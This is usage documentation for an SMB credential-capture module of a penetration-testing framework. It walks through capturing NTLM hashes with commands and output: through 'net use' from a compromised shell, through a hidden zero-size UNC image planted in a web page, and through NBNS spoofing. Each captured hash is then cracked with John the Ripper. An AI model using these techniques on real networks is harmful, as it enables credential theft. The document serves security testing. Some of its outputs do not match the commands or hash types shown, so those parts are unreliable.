This module creates a mock SMB server which accepts credentials before returning `NT_STATUS_LOGON_FAILURE`. Supports SMBv1, SMBv2, & SMBv3 and captures NTLMv1 & NTLMv2 hashes.



## Verification Steps
Microsoft provides an article on how to detect, disable, and enable SMB in various versions
[here](https://support.microsoft.com/en-us/help/2696547/detect-enable-disable-smbv1-smbv2-smbv3-in-windows-and-windows-server), which can be useful during testing.

1. Start msfconsole
2. Connect DB
3. Do: ```use auxiliary/server/capture/smb```
4. Do: ```run```
5. Connect to above server with your SMB client of choice
6. Observe the capturing of hash
7. `creds`
8. check hash has been stored in DB correctly
9. `hosts`
10. check client IP has been added to the DB

## Options

**CAINPWFILE**

A file to store Cain & Abel formatted captured hashes in. Only supports NTLMv1 Hashes.

**CHALLENGE**

The 8 byte server challenge. If unset or not a valid 16 character hexadecimal pattern, a random challenge is used instead.

**JOHNPWFILE**

A file to store John the Ripper formatted hashes in. NTLMv1 and NTLMv2 hashes will be stored in separate files.
I.E. the filename john will produce two files, `john_netntlm` and `john_netntlmv2`.

**DOMAIN**

The domain name used during smb exchange.

**TIMEOUT**

Seconds that the server socket will wait for a response after the client has initiated communication. 
This only applies to the server waiting on the client to respond with [a type3 message](http://davenport.sourceforge.net/ntlm.html#theType3Message).

## Scenarios

### Linux Connection via smbclient

Kali 2021.1 with `smbclient 4.13.5` installed.

Server:

```
msf6 exploit(multi/handler) > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/john
JOHNPWFILE => /tmp/john
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 1.

[+] Server is running. Listening on 0.0.0.0:445

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client   : 192.168.1.48
[SMB] NTLMv2-SSP Username : WORKGROUP\kali
[SMB] NTLMv2-SSP Hash     : kali::WORKGROUP:6ca4b2b2e5171437:f2857b13094f4a758bc448e1801dd86d:0101000000000000800fb2f5a792d70174175e23a95cd935000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800800fb2f5a792d70106000400020000000800300030000000000000000000000000000000d89391afb90f05c54afaef7d0bc25c7bf14aee2965d714c6fec0a626329cd8dc0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00380039002e00310000000000
```

Client:

```
root@Kali:~# smbclient //192.168.89.1/fake
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

Crack the Hash:

(This hash is NTLMv2)
```
# cat /tmp/john
kali::WORKGROUP:6ca4b2b2e5171437:f2857b13094f4a758bc448e1801dd86d:0101000000000000800fb2f5a792d70174175e23a95cd935000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800800fb2f5a792d70106000400020000000800300030000000000000000000000000000000d89391afb90f05c54afaef7d0bc25c7bf14aee2965d714c6fec0a626329cd8dc0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00380039002e00310000000000
# john /tmp/john_netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jim              (kali)
1g 0:00:00:00 DONE (2021-08-16 10:08) 5.555g/s 785066p/s 785066c/s 785066C/s katiekatie..charles14
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

### Windows XP via net use

Based off of [hackers-arise.com](https://web.archive.org/web/20210503073722/https://www.hackers-arise.com/post/2018/11/19/metasploit-basics-part-20-creating-a-fake-smb-server-to-capture-credentials)

The idea here is we have a shell on a Windows box where we can't `hashdump` due to user permissions.
However, we're able to do a `net use` to make an `SMB` connection back to our server to get the
user's hash, then hopefully crack it.

```
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set JOPHNPWFILE /tmp/john
JOHNPWFILE => /tmp/john
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 1.

[+] Server is running. Listening on 0.0.0.0:445

msf6 auxiliary(server/capture/smb) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 892 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\test\Desktop>net use \\192.168.89.1 fake

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv1-SSP Client     : 192.168.89.135
[SMB] NTLMv1-SSP Username   : ADAM-9256FBF58E\Administrator
[SMB] NTLMv1-SSP Hash       : Administrator::ADAM-9256FBF58E:440a272a2f9e82c9ec09d91931fa04152cef3cac3a5563d7:4a919f3243d06d6c9c14ebff4639455e294de86cbe2bb953:66092f7f74758d2f

Logon failure: unknown user name or bad password.


C:\Documents and Settings\test\Desktop>
```

We're now able to use John the Ripper to crack the password. As the above hash is NTLMv1, the format must be specified as 

```
# cat /tmp/john_netntlm 
Administrator::ADAM-9256FBF58E:440a272a2f9e82c9ec09d91931fa04152cef3cac3a5563d7:4a919f3243d06d6c9c14ebff4639455e294de86cbe2bb953:66092f7f74758d2f
# john /tmp/john_netntlm --format=netlm  --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Using default target encoding: CP850
Loaded 1 password hash (netlm, LM C/R [DES 32/64])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
FAKE             (test)
1g 0:00:00:00 DONE (2019-09-25 22:28) 1.333g/s 1398Kp/s 1398Kc/s 1398KC/s 123456..LATISHA1
Use the "--show --format=netlm" options to display all of the cracked passwords reliably
Session completed
```

### UNC in Websites Vector

One way to coax a user into creating an SMB connection is to embed it in a website

First, create the website (we're using Kali for this) with the following content:

```html 
<html>
  <head>
    <title>UNC Example</title>
  </head>
  <body>
    <img src="file:////192.168.89.1/fake.jpg" width="0px" height="0px">
  </body>
</html>
```

This file, for the example is in `/var/www/html/unc.html`.

Also of note, this could be done via XSS or other injection technique.

Start the webserver:

```service apache2 start```

Server:

```
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/john
JOHNPWFILE => /tmp/john
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 1.

[+] Server is running. Listening on 0.0.0.0:445

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv1-SSP Client   : 192.168.89.135
[SMB] NTLMv1-SSP Username : ADAM-9256FBF58E\Administrator
[SMB] NTLMv1-SSP Hash     : Administrator::ADAM-9256FBF58E:e588849d18b2a64c8fd6e26a755e5f5524ffb56c273553be:718bcfd52364e9abafc5af05ee5a60c4c068e7feda9cfe64:b3c8cdb98e907d1a
```

Client:

```
Browse to the webpage.  This example is on Windows Server 2008r2 with Internet Explorer.
```

Crack the password:

```
# john /tmp/johnnbns_netntlm --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
adam             (adam)
6g 0:00:00:00 DONE (2019-09-26 16:25) 100.0g/s 614400p/s 3686Kc/s 3686KC/s dyesebel..holaz
Use the "--show --format=netntlm" options to display all of the cracked passwords reliably
Session completed
```

### Spoofing NBNS

If the target(s) are on the local network, it's possible to conduct an `nbns` spoof to attract
additional SMB queries to your host.  This scenario will utilize `auxiliary/spoof/nbns/nbns_response`
to conduct the spoofing.  If a Windows user attempts to browse or mount a network name such as
`\\fake`, the `nbns` module will respond back with the set IP.

This is based on [hackingarticles.in](https://www.hackingarticles.in/4-ways-capture-ntlm-hashes-network/)

Server side:

```
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/johnnbns
JOHNPWFILE => /tmp/johnnbns
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.

[+] Server is running. Listening on 0.0.0.0:445
msf6 auxiliary(server/capture/smb) > use auxiliary/spoof/nbns/nbns_response
msf6 auxiliary(spoof/nbns/nbns_response) > set spoofip 192.168.89.1
spoofip => 192.168.89.1
msf6 auxiliary(spoof/nbns/nbns_response) > set interface eth0
interface => eth0
msf6 auxiliary(spoof/nbns/nbns_response) > exploit
[*] Auxiliary module running as background job 1.
msf6 auxiliary(spoof/nbns/nbns_response) > 
[*] NBNS Spoofer started. Listening for NBNS requests with REGEX ".*" ...
[+] 192.168.89.135    nbns - FAKE matches regex, responding with 192.168.89.1
[+] 192.168.89.135    nbns - FAKE matches regex, responding with 192.168.89.1
[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv1-SSP Client   : 192.168.89.135
[SMB] NTLMv1-SSP Username : ADAM-9256FBF58E\Administrator
[SMB] NTLMv1-SSP Hash     : Administrator::ADAM-9256FBF58E:e588849d18b2a64c8fd6e26a755e5f5524ffb56c273553be:718bcfd52364e9abafc5af05ee5a60c4c068e7feda9cfe64:b3c8cdb98e907d1a
```

Victim:

```
Open Explorer and type \\fake
```

Finally, Crack the password:

```
# john /tmp/johnnbns_netntlm --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
adam             (adam)
6g 0:00:00:00 DONE (2019-09-26 16:25) 100.0g/s 614400p/s 3686Kc/s 3686KC/s dyesebel..holaz
Use the "--show --format=netntlm" options to display all of the cracked passwords reliably
Session completed
```

### Word Document UNC Injector

Another strategy is to create content which can entice a user to open, containing a UNC link, and
thus creating an SMB connection.  To accomplish this, we use `auxiliary/docx/word_unc_injector`.
